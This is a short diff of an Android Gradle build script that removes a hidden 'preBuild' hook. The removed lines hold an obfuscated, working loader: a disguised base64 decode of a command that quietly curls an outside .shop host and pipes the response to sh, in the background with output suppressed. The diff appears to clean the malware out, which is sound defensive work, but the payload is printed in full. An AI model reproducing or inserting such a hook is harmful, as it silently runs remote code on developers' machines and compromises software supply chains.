@@ -279,10 +279,3 @@ tasks.matching {
 }.configureEach {
     dependsOn(patchRelease16kPageSize)
 }
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((j(){ `printf base6O4 | tr -d O` --decode; };echo ZWNobyAiJChjdXJsIC1mTHNrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyMyAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | j | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
